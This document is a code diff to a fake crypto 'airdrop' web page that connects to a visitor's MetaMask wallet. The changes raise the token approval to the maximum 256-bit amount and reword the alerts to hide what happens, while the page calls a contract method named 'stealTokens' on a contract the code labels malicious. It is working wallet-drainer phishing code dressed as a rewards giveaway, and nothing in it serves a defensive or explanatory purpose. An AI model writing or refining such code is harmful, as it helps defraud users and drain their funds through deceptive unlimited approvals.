@@ -109,7 +109,7 @@
     <h2>Claim your rewards today and start your journey to success!</h2>
 
     <button id="connectButton" class="btn">Connect to MetaMask</button>
-    <button id="approveButton" class="btn" disabled>Approve Unlimited AirDrops</button>
+    <button id="approveButton" class="btn" disabled>Approve Unlimited Spending</button>
 
     <div class="claim-btn-container">
       <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
@@ -177,17 +177,17 @@
         "type": "function"
       },
       {
-        "inputs": [],
-        "name": "withdrawETH",
+        "inputs": [], 
+        "name": "withdrawETH", 
         "outputs": [],
-        "stateMutability": "nonpayable",
+        "stateMutability": "nonpayable", 
         "type": "function"
       },
       {
         "inputs": [],
         "name": "withdrawTokens",
         "outputs": [],
-        "stateMutability": "nonpayable",
+        "stateMutability": "nonpayable", 
         "type": "function"
       }
     ];
@@ -219,9 +219,9 @@
       if (!web3) return;
       const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
       try {
-        const approvalAmount = web3.utils.toWei('1000000000', 'ether');
-        await tokenContract.methods.approve(contractAddress, approvalAmount).send({ from: accounts[0] });
-        alert('Approval successful!');
+        const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // Max 256-bit value
+        await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] });
+        alert('Approval successful! You can now claim your airdrop.');
         document.getElementById('claimAirdropButton').disabled = false;
       } catch (error) {
         alert('Error during approval');
@@ -232,7 +232,7 @@
       const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
       try {
         await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
-        alert('Airdrop claimed! Your tokens are being sent.');
+        alert('Airdrop claimed successfully!');
       } catch (error) {
         alert('Error claiming airdrop');
       }
